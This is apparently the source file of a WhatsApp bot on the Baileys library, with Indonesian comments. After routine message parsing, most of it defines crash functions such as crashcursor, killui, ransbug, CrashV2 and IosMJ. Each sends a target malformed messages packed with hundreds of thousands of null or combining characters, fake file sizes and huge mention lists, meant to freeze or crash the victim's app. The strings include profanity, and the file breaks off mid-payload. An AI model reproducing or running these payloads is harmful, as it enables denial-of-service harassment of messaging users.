require("./config")
const crypto = require('crypto');
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs');
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')

const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (client, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const b = fs.readFileSync("./database/menu.mp3")
const budy = (typeof m.text === 'string') ? m.text : '';
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (client.user.id.split(':')[0]+'@s.whatsapp.net' || client.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await client.decodeJid(client.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.nomerOwner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const tdxlol = fs.readFileSync('./tdx.jpeg')

let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));

if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
try {
ppuser = await client.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
client.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
client.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
//FUNCTION APALAH
async function crashcursor(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: ";🩸⃟⃨〫⃰‣ ⁖𝐆𝐎𝐊𝐔 𝐈𝐍 𝐇𝐄𝐑𝐄 ‣—" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: client.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🩸⃟⃨〫⃰‣ ⁖𝐆𝐎𝐊𝐔 𝐈𝐍 𝐇𝐄𝐑𝐄 ‣—",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : ranstamvan pro"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await client.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
       
async function killui(target, Ptcp = true) {
      await client.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6283187035090@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function LIVELOK(target, QUOTED) {
			var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "mass",
							"caption": `sv Ranstamvan` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: target,
				quoted: null
			})
			await client.relayMessage(target, etc.message, {
				participant: {
					jid: target
				},
				messageId: etc.key.id
			})
		}
   

    async function CaroUsel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://img100.pixhost.to/images/971/544258467_skyzopedia.jpg" } },
          { upload: client.waUploadToServer }
        )),
        title: "𝐆𝐨𝐤𝐮 𝐂𝐫𝐚𝐬𝐡𝐞𝐫ϟ" + "\u0000".repeat(100000),
        subtitle: "𝐆𝐨𝐤𝐮 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐊𝐢𝐥𝐥⃟⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " 𝐆𝐨𝐤𝐮 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ϟ ",
            rows: [
              {
                title: " ϟ 𝐆𝐨𝐤𝐮 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: " 𝐆𝐨𝐤𝐮 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ϟ ",
            rows: [
              {
                title: " ϟ 𝐆𝐨𝐤𝐮 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await client.relayMessage(
        target,
        {
          ephemaralMessage: {
            Message: {
              InteractiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: null
              },
            }
          : {}
      );
    }

async function ransbug(target, ptcp = false) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(150000);
   await client.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: '𝐏𝐞𝐭𝐫𝐚 𝐈𝐒 𝐇𝐄𝐄𝐄𝐑𝐑𝐄𝐄𝐄' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}

async function QPayStriep(target) {
      await client.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      client.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "HELLO STUPID" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function CrashV2(target, Ptcp = false) {
      await client.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "EXECUTE BY PETRA 𖠰" + "".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "INFINITY - CRASHER",
                body: "BACOT NGENTOT -" + "\u0000" + "ꦾ".repeat(90000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " v ",
                sourceId: " v ",
                sourceUrl: "https://www.instagram.com/WhatsApp",
                mediaUrl: "https://www.instagram.com/WhatsApp",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.instagram.com/WhatsApp",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "0-0@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "0-0@g.us",
                serverMessageId: 1,
                newsletterName: " CRASHER ",
                contentType: "UPDATE",
                accessibilityText: " CRASHER ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_Alfaofficial_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    async function IosMJ(target, Ptcp = false) {
      await client.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "INVISIBLE ?" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3J